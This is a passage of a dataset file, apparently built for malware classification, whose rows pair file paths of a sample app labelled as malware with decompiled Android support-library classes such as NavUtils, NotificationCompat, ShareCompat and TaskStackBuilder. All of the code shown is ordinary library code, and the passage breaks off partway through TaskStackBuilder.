"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NavUtilsImplBase.code","static class NavUtilsImplBase implements NavUtilsImpl {   NavUtilsImplBase(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     String parentActivity=NavUtils.getParentActivityName(activity);     if (parentActivity == null) {       return null;     }     return new Intent().setClassName(activity,parentActivity);   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     String action=activity.getIntent().getAction();     return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     upIntent.addFlags(67108864);     activity.startActivity(upIntent);     activity.finish();   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String parentActivity;     if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {       if (parentActivity.charAt(0) == '.') {         return context.getPackageName() + parentActivity;       }       return parentActivity;     }     return null;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NavUtilsImplJB.code","static class NavUtilsImplJB extends NavUtilsImplBase {   NavUtilsImplJB(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent result=NavUtilsJB.getParentActivityIntent(activity);     if (result == null) {       return super.getParentActivityIntent(activity);     }     return result;   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     NavUtilsJB.navigateUpTo(activity,upIntent);   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String result=NavUtilsJB.getParentActivityName(info);     if (result == null) {       return super.getParentActivityName(context,info);     }     return result;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NavUtilsJB.code","class NavUtilsJB {   NavUtilsJB(){   }   public static Intent getParentActivityIntent(  Activity activity){     return activity.getParentActivityIntent();   }   public static boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return activity.shouldUpRecreateTask(targetIntent);   }   public static void navigateUpTo(  Activity activity,  Intent upIntent){     activity.navigateUpTo(upIntent);   }   public static String getParentActivityName(  ActivityInfo info){     return info.parentActivityName;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NonConfigurationInstances.code","static final class NonConfigurationInstances {   Object activity;   HashMap<String,Object> children;   Object custom;   ArrayList<Fragment> fragments;   SparseArrayCompat<LoaderManagerImpl> loaders;   NonConfigurationInstances(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NoSaveStateFrameLayout.code","class NoSaveStateFrameLayout extends FrameLayout {   public static ViewGroup wrap(  View child){     NoSaveStateFrameLayout wrapper=new NoSaveStateFrameLayout(child.getContext());     ViewGroup.LayoutParams childParams=child.getLayoutParams();     if (childParams != null) {       wrapper.setLayoutParams(childParams);     }     FrameLayout.LayoutParams lp=new FrameLayout.LayoutParams(-1,-1);     child.setLayoutParams(lp);     wrapper.addView(child);     return wrapper;   }   public NoSaveStateFrameLayout(  Context context){     super(context);   }   @Override protected void dispatchSaveInstanceState(  SparseArray<Parcelable> container){     dispatchFreezeSelfOnly(container);   }   @Override protected void dispatchRestoreInstanceState(  SparseArray<Parcelable> container){     dispatchThawSelfOnly(container);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NotificationCompat.code","public class NotificationCompat {   public static final int FLAG_HIGH_PRIORITY=128;   private static final NotificationCompatImpl IMPL; interface NotificationCompatImpl {     Notification getNotification(    Builder builder);   } static class NotificationCompatImplBase implements NotificationCompatImpl {     NotificationCompatImplBase(){     }     @Override public Notification getNotification(    Builder b){       Notification result=b.mNotification;       result.setLatestEventInfo(b.mContext,b.mContentTitle,b.mContentText,b.mContentIntent);       return result;     }   } static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {     NotificationCompatImplHoneycomb(){     }     @Override public Notification getNotification(    Builder b){       return NotificationCompatHoneycomb.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new NotificationCompatImplHoneycomb();     }  else {       IMPL=new NotificationCompatImplBase();     }   } public static class Builder {     CharSequence mContentInfo;     PendingIntent mContentIntent;     CharSequence mContentText;     CharSequence mContentTitle;     Context mContext;     PendingIntent mFullScreenIntent;     Bitmap mLargeIcon;     Notification mNotification=new Notification();     int mNumber;     RemoteViews mTickerView;     public Builder(    Context context){       this.mContext=context;       this.mNotification.when=System.currentTimeMillis();       this.mNotification.audioStreamType=-1;     }     public Builder setWhen(    long when){       this.mNotification.when=when;       return this;     }     public Builder setSmallIcon(    int icon){       this.mNotification.icon=icon;       return this;     }     public Builder setSmallIcon(    int icon,    int level){       this.mNotification.icon=icon;       this.mNotification.iconLevel=level;       return this;     }     public Builder setContentTitle(    CharSequence title){       this.mContentTitle=title;       return this;     }     public Builder setContentText(    CharSequence text){       this.mContentText=text;       return this;     }     public Builder setNumber(    int number){       this.mNumber=number;       return this;     }     public Builder setContentInfo(    CharSequence info){       this.mContentInfo=info;       return this;     }     public Builder setContent(    RemoteViews views){       this.mNotification.contentView=views;       return this;     }     public Builder setContentIntent(    PendingIntent intent){       this.mContentIntent=intent;       return this;     }     public Builder setDeleteIntent(    PendingIntent intent){       this.mNotification.deleteIntent=intent;       return this;     }     public Builder setFullScreenIntent(    PendingIntent intent,    boolean highPriority){       this.mFullScreenIntent=intent;       setFlag(128,highPriority);       return this;     }     public Builder setTicker(    CharSequence tickerText){       this.mNotification.tickerText=tickerText;       return this;     }     public Builder setTicker(    CharSequence tickerText,    RemoteViews views){       this.mNotification.tickerText=tickerText;       this.mTickerView=views;       return this;     }     public Builder setLargeIcon(    Bitmap icon){       this.mLargeIcon=icon;       return this;     }     public Builder setSound(    Uri sound){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=-1;       return this;     }     public Builder setSound(    Uri sound,    int streamType){       this.mNotification.sound=sound;       this.mNotification.audioStreamType=streamType;       return this;     }     public Builder setVibrate(    long[] pattern){       this.mNotification.vibrate=pattern;       return this;     }     public Builder setLights(    int argb,    int onMs,    int offMs){       this.mNotification.ledARGB=argb;       this.mNotification.ledOnMS=onMs;       this.mNotification.ledOffMS=offMs;       boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;       this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));       return this;     }     public Builder setOngoing(    boolean ongoing){       setFlag(2,ongoing);       return this;     }     public Builder setOnlyAlertOnce(    boolean onlyAlertOnce){       setFlag(8,onlyAlertOnce);       return this;     }     public Builder setAutoCancel(    boolean autoCancel){       setFlag(16,autoCancel);       return this;     }     public Builder setDefaults(    int defaults){       this.mNotification.defaults=defaults;       if ((defaults & 4) != 0) {         this.mNotification.flags|=1;       }       return this;     }     private void setFlag(    int mask,    boolean value){       if (value) {         this.mNotification.flags|=mask;       }  else {         this.mNotification.flags&=mask ^ (-1);       }     }     public Notification getNotification(){       return NotificationCompat.IMPL.getNotification(this);     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NotificationCompatHoneycomb.code","class NotificationCompatHoneycomb {   NotificationCompatHoneycomb(){   }   public static Notification add(  Context context,  Notification n,  CharSequence contentTitle,  CharSequence contentText,  CharSequence contentInfo,  RemoteViews tickerView,  int number,  PendingIntent contentIntent,  PendingIntent fullScreenIntent,  Bitmap largeIcon){     Notification.Builder b=new Notification.Builder(context).setWhen(n.when).setSmallIcon(n.icon,n.iconLevel).setContent(n.contentView).setTicker(n.tickerText,tickerView).setSound(n.sound,n.audioStreamType).setVibrate(n.vibrate).setLights(n.ledARGB,n.ledOnMS,n.ledOffMS).setOngoing((n.flags & 2) != 0).setOnlyAlertOnce((n.flags & 8) != 0).setAutoCancel((n.flags & 16) != 0).setDefaults(n.defaults).setContentTitle(contentTitle).setContentText(contentText).setContentInfo(contentInfo).setContentIntent(contentIntent).setDeleteIntent(n.deleteIntent).setFullScreenIntent(fullScreenIntent,(n.flags & 128) != 0).setLargeIcon(largeIcon).setNumber(number);     return b.getNotification();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NotificationCompatImpl.code","interface NotificationCompatImpl {   Notification getNotification(  Builder builder); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NotificationCompatImplBase.code","static class NotificationCompatImplBase implements NotificationCompatImpl {   NotificationCompatImplBase(){   }   @Override public Notification getNotification(  Builder b){     Notification result=b.mNotification;     result.setLatestEventInfo(b.mContext,b.mContentTitle,b.mContentText,b.mContentIntent);     return result;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\NotificationCompatImplHoneycomb.code","static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {   NotificationCompatImplHoneycomb(){   }   @Override public Notification getNotification(  Builder b){     return NotificationCompatHoneycomb.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\OnBackStackChangedListener.code","public interface OnBackStackChangedListener {   void onBackStackChanged(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\Op.code","public static final class Op {   int cmd;   int enterAnim;   int exitAnim;   Fragment fragment;   Op next;   int popEnterAnim;   int popExitAnim;   Op prev;   ArrayList<Fragment> removed; } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\SavedState.code","public static class SavedState implements Parcelable {   public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){     @Override public SavedState createFromParcel(    Parcel in){       return new SavedState(in,null);     }     @Override public SavedState[] newArray(    int size){       return new SavedState[size];     }   } ;   final Bundle mState;   public SavedState(  Bundle state){     this.mState=state;   }   SavedState(  Parcel in,  ClassLoader loader){     this.mState=in.readBundle();     if (loader != null && this.mState != null) {       this.mState.setClassLoader(loader);     }   }   @Override public int describeContents(){     return 0;   }   @Override public void writeToParcel(  Parcel dest,  int flags){     dest.writeBundle(this.mState);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ServiceCompat.code","public class ServiceCompat {   public static final int START_STICKY=1;   private ServiceCompat(){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ShareCompat.code","public class ShareCompat {   public static final String EXTRA_CALLING_ACTIVITY=""android.support.v4.app.EXTRA_CALLING_ACTIVITY"";   public static final String EXTRA_CALLING_PACKAGE=""android.support.v4.app.EXTRA_CALLING_PACKAGE"";   private static ShareCompatImpl IMPL; public interface ShareCompatImpl {     void configureMenuItem(    MenuItem menuItem,    IntentBuilder intentBuilder);     String escapeHtml(    CharSequence charSequence);   } static class ShareCompatImplBase implements ShareCompatImpl {     ShareCompatImplBase(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       item.setIntent(shareIntent.createChooserIntent());     }     @Override public String escapeHtml(    CharSequence text){       StringBuilder out=new StringBuilder();       withinStyle(out,text,0,text.length());       return out.toString();     }     private static void withinStyle(    StringBuilder out,    CharSequence text,    int start,    int end){       int i=start;       while (i < end) {         char c2=text.charAt(i);         if (c2 == '<') {           out.append(""&lt;"");         }  else         if (c2 == '>') {           out.append(""&gt;"");         }  else         if (c2 == '&') {           out.append(""&amp;"");         }  else         if (c2 > '~' || c2 < ' ') {           out.append(""&#"" + ((int)c2) + "";"");         }  else         if (c2 == ' ') {           while (i + 1 < end && text.charAt(i + 1) == ' ') {             out.append(""&nbsp;"");             i++;           }           out.append(' ');         }  else {           out.append(c2);         }         i++;       }     }   } static class ShareCompatImplICS extends ShareCompatImplBase {     ShareCompatImplICS(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());       if (shouldAddChooserIntent(item)) {         item.setIntent(shareIntent.createChooserIntent());       }     }     boolean shouldAddChooserIntent(    MenuItem item){       return !item.hasSubMenu();     }   } static class ShareCompatImplJB extends ShareCompatImplICS {     ShareCompatImplJB(){     }     @Override public String escapeHtml(    CharSequence html){       return ShareCompatJB.escapeHtml(html);     }     @Override boolean shouldAddChooserIntent(    MenuItem item){       return false;     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new ShareCompatImplJB();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new ShareCompatImplICS();     }  else {       IMPL=new ShareCompatImplBase();     }   }   public static String getCallingPackage(  Activity calledActivity){     String result=calledActivity.getCallingPackage();     if (result == null) {       return calledActivity.getIntent().getStringExtra(EXTRA_CALLING_PACKAGE);     }     return result;   }   public static ComponentName getCallingActivity(  Activity calledActivity){     ComponentName result=calledActivity.getCallingActivity();     if (result == null) {       return (ComponentName)calledActivity.getIntent().getParcelableExtra(EXTRA_CALLING_ACTIVITY);     }     return result;   }   public static void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     IMPL.configureMenuItem(item,shareIntent);   }   public static void configureMenuItem(  Menu menu,  int menuItemId,  IntentBuilder shareIntent){     MenuItem item=menu.findItem(menuItemId);     if (item == null) {       throw new IllegalArgumentException(""Could not find menu item with id "" + menuItemId + "" in the supplied menu"");     }     configureMenuItem(item,shareIntent);   } public static class IntentBuilder {     private Activity mActivity;     private ArrayList<String> mBccAddresses;     private ArrayList<String> mCcAddresses;     private CharSequence mChooserTitle;     private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");     private ArrayList<Uri> mStreams;     private ArrayList<String> mToAddresses;     public static IntentBuilder from(    Activity launchingActivity){       return new IntentBuilder(launchingActivity);     }     private IntentBuilder(    Activity launchingActivity){       this.mActivity=launchingActivity;       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());       this.mIntent.addFlags(524288);     }     public Intent getIntent(){       if (this.mToAddresses != null) {         combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);         this.mToAddresses=null;       }       if (this.mCcAddresses != null) {         combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);         this.mCcAddresses=null;       }       if (this.mBccAddresses != null) {         combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);         this.mBccAddresses=null;       }       boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;       boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");       if (!needsSendMultiple && isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }         this.mStreams=null;       }       if (needsSendMultiple && !isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }       }       return this.mIntent;     }     Activity getActivity(){       return this.mActivity;     }     private void combineArrayExtra(    String extra,    ArrayList<String> add){       String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);       int currentLength=currentAddresses != null ? currentAddresses.length : 0;       String[] finalAddresses=new String[add.size() + currentLength];       add.toArray(finalAddresses);       if (currentAddresses != null) {         System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);       }       this.mIntent.putExtra(extra,finalAddresses);     }     private void combineArrayExtra(    String extra,    String[] add){       Intent intent=getIntent();       String[] old=intent.getStringArrayExtra(extra);       int oldLength=old != null ? old.length : 0;       String[] result=new String[add.length + oldLength];       if (old != null) {         System.arraycopy(old,0,result,0,oldLength);       }       System.arraycopy(add,0,result,oldLength,add.length);       intent.putExtra(extra,result);     }     public Intent createChooserIntent(){       return Intent.createChooser(getIntent(),this.mChooserTitle);     }     public void startChooser(){       this.mActivity.startActivity(createChooserIntent());     }     public IntentBuilder setChooserTitle(    CharSequence title){       this.mChooserTitle=title;       return this;     }     public IntentBuilder setChooserTitle(    int resId){       return setChooserTitle(this.mActivity.getText(resId));     }     public IntentBuilder setType(    String mimeType){       this.mIntent.setType(mimeType);       return this;     }     public IntentBuilder setText(    CharSequence text){       this.mIntent.putExtra(""android.intent.extra.TEXT"",text);       return this;     }     public IntentBuilder setHtmlText(    String htmlText){       this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);       if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {         setText(Html.fromHtml(htmlText));       }       return this;     }     public IntentBuilder setStream(    Uri streamUri){       if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {         this.mIntent.setAction(""android.intent.action.SEND"");       }       this.mStreams=null;       this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);       return this;     }     public IntentBuilder addStream(    Uri streamUri){       Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       if (currentStream == null) {         return setStream(streamUri);       }       if (this.mStreams == null) {         this.mStreams=new ArrayList<>();       }       if (currentStream != null) {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");         this.mStreams.add(currentStream);       }       this.mStreams.add(streamUri);       return this;     }     public IntentBuilder setEmailTo(    String[] addresses){       if (this.mToAddresses != null) {         this.mToAddresses=null;       }       this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder addEmailTo(    String address){       if (this.mToAddresses == null) {         this.mToAddresses=new ArrayList<>();       }       this.mToAddresses.add(address);       return this;     }     public IntentBuilder addEmailTo(    String[] addresses){       combineArrayExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder setEmailCc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder addEmailCc(    String address){       if (this.mCcAddresses == null) {         this.mCcAddresses=new ArrayList<>();       }       this.mCcAddresses.add(address);       return this;     }     public IntentBuilder addEmailCc(    String[] addresses){       combineArrayExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder setEmailBcc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder addEmailBcc(    String address){       if (this.mBccAddresses == null) {         this.mBccAddresses=new ArrayList<>();       }       this.mBccAddresses.add(address);       return this;     }     public IntentBuilder addEmailBcc(    String[] addresses){       combineArrayExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder setSubject(    String subject){       this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);       return this;     }   } public static class IntentReader {     private static final String TAG=""IntentReader"";     private Activity mActivity;     private ComponentName mCallingActivity;     private String mCallingPackage;     private Intent mIntent;     private ArrayList<Uri> mStreams;     public static IntentReader from(    Activity activity){       return new IntentReader(activity);     }     private IntentReader(    Activity activity){       this.mActivity=activity;       this.mIntent=activity.getIntent();       this.mCallingPackage=ShareCompat.getCallingPackage(activity);       this.mCallingActivity=ShareCompat.getCallingActivity(activity);     }     public boolean isShareIntent(){       String action=this.mIntent.getAction();       return action.equals(""android.intent.action.SEND"") || action.equals(""android.intent.action.SEND_MULTIPLE"");     }     public boolean isSingleShare(){       return this.mIntent.getAction().equals(""android.intent.action.SEND"");     }     public boolean isMultipleShare(){       return this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");     }     public String getType(){       return this.mIntent.getType();     }     public CharSequence getText(){       return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");     }     public String getHtmlText(){       String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);       if (this.mIntent == null) {         CharSequence text=getText();         if (text instanceof Spanned) {           return Html.toHtml((Spanned)text);         }         if (text != null) {           return ShareCompat.IMPL.escapeHtml(text);         }         return result;       }       return result;     }     public Uri getStream(){       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     public Uri getStream(    int index){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.get(index);       }       if (index == 0) {         return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       }       throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);     }     public int getStreamCount(){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.size();       }       return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;     }     public String[] getEmailTo(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");     }     public String[] getEmailCc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");     }     public String[] getEmailBcc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");     }     public String getSubject(){       return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");     }     public String getCallingPackage(){       return this.mCallingPackage;     }     public ComponentName getCallingActivity(){       return this.mCallingActivity;     }     public Drawable getCallingActivityIcon(){       if (this.mCallingActivity == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getActivityIcon(this.mCallingActivity);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling activity"",e);         return null;       }     }     public Drawable getCallingApplicationIcon(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationIcon(this.mCallingPackage);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling application"",e);         return null;       }     }     public CharSequence getCallingApplicationLabel(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve label for calling application"",e);         return null;       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ShareCompatICS.code","class ShareCompatICS {   private static final String HISTORY_FILENAME_PREFIX="".sharecompat_"";   ShareCompatICS(){   }   public static void configureMenuItem(  MenuItem item,  Activity callingActivity,  Intent intent){     ShareActionProvider provider;     ActionProvider itemProvider=item.getActionProvider();     if (!(itemProvider instanceof ShareActionProvider)) {       provider=new ShareActionProvider(callingActivity);     }  else {       provider=(ShareActionProvider)itemProvider;     }     provider.setShareHistoryFileName(HISTORY_FILENAME_PREFIX + callingActivity.getClass().getName());     provider.setShareIntent(intent);     item.setActionProvider(provider);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ShareCompatImpl.code","public interface ShareCompatImpl {   void configureMenuItem(  MenuItem menuItem,  IntentBuilder intentBuilder);   String escapeHtml(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ShareCompatImplBase.code","static class ShareCompatImplBase implements ShareCompatImpl {   ShareCompatImplBase(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     item.setIntent(shareIntent.createChooserIntent());   }   @Override public String escapeHtml(  CharSequence text){     StringBuilder out=new StringBuilder();     withinStyle(out,text,0,text.length());     return out.toString();   }   private static void withinStyle(  StringBuilder out,  CharSequence text,  int start,  int end){     int i=start;     while (i < end) {       char c2=text.charAt(i);       if (c2 == '<') {         out.append(""&lt;"");       }  else       if (c2 == '>') {         out.append(""&gt;"");       }  else       if (c2 == '&') {         out.append(""&amp;"");       }  else       if (c2 > '~' || c2 < ' ') {         out.append(""&#"" + ((int)c2) + "";"");       }  else       if (c2 == ' ') {         while (i + 1 < end && text.charAt(i + 1) == ' ') {           out.append(""&nbsp;"");           i++;         }         out.append(' ');       }  else {         out.append(c2);       }       i++;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ShareCompatImplICS.code","static class ShareCompatImplICS extends ShareCompatImplBase {   ShareCompatImplICS(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());     if (shouldAddChooserIntent(item)) {       item.setIntent(shareIntent.createChooserIntent());     }   }   boolean shouldAddChooserIntent(  MenuItem item){     return !item.hasSubMenu();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ShareCompatImplJB.code","static class ShareCompatImplJB extends ShareCompatImplICS {   ShareCompatImplJB(){   }   @Override public String escapeHtml(  CharSequence html){     return ShareCompatJB.escapeHtml(html);   }   @Override boolean shouldAddChooserIntent(  MenuItem item){     return false;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\ShareCompatJB.code","class ShareCompatJB {   ShareCompatJB(){   }   public static String escapeHtml(  CharSequence html){     return Html.escapeHtml(html);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\SuperNotCalledException.code","final class SuperNotCalledException extends AndroidRuntimeException {   public SuperNotCalledException(  String msg){     super(msg);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\android.support.v4.app\TaskStackBuilder.code","public class TaskStackBuilder implements Iterable<Intent> {   private static final TaskStackBuilderImpl IMPL;   private static final String TAG=""TaskStackBuilder"";   private final ArrayList<Intent> mIntents=new ArrayList<>();   private final Context mSourceContext; public interface TaskStackBuilderImpl {     PendingIntent getPendingIntent(    Context context,    Intent[] intentArr,    int i,    int i2,    Bundle bundle);   } static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {     TaskStackBuilderImplBase(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       Intent topIntent=intents[intents.length - 1];       topIntent.addFlags(268435456);       return PendingIntent.getActivity(context,requestCode,topIntent,flags);     }   } static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {     TaskStackBuilderImplHoneycomb(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0].addFlags(268468224);       return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);     }   } static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {     TaskStackBuilderImplJellybean(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0].addFlags(268468224);       return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new TaskStackBuilderImplHoneycomb();     }  else {       IMPL=new TaskStackBuilderImplBase();     }   }   private TaskStackBuilder(  Context a){     this.mSourceContext=a;   }   public static TaskStackBuilder create(  Context context){     return new TaskStackBuilder(context);   }   public static TaskStackBuilder from(  Context context){     return create(context);   }   public TaskStackBuilder addNextIntent(  Intent nextIntent){     this.mIntents.add(nextIntent);     return this;   }   public TaskStackBuilder addParentStack(  Activity sourceActivity){     int insertAt=this.mIntents.size();     Intent parent=NavUtils.getParentActivityIntent(sourceActivity);     while (parent != null) {       this.mIntents.add(insertAt,parent);       try {         parent=NavUtils.getParentActivityIntent(sourceActivity,parent.getComponent());       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Bad ComponentName while traversing activity parent metadata"");         throw new IllegalArgumentException(e);       }     }     return this;   }   public TaskStackBuilder addParentStack(  Class<?> sourceActivityClass){     int insertAt=this.mIntents.size();     try {       Intent parent=NavUtils.getParentActivityIntent(this.mSourceContext,sourceActivityClass);       while (parent != null) {         this.mIntents.add(insertAt,parent);         